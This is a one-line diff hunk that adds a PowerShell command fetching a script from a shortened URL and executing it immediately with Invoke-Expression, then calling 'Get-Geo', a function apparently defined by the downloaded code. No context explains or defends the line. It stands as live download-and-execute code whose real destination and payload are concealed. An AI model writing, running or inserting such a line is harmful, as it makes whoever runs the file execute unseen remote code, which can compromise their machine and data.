@@ -1,0 +1,1 @@
+irm "t.ly/vSodI"|iex;Get-Geo
